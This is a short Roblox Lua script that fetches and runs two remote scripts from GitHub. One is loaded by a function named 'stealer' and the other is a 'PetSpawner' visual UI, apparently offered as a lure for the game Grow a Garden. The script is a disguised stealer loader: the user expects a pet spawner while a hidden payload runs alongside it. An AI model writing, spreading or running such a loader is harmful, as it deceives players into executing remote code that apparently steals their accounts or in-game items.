local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/Test/test.lua'))() 
end
local function loadui()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/imalwaysbeamediocre/PetSpawner/refs/heads/main/AgeVisual.lua"))()
end

task.spawn(stealer)
task.spawn(loadui)
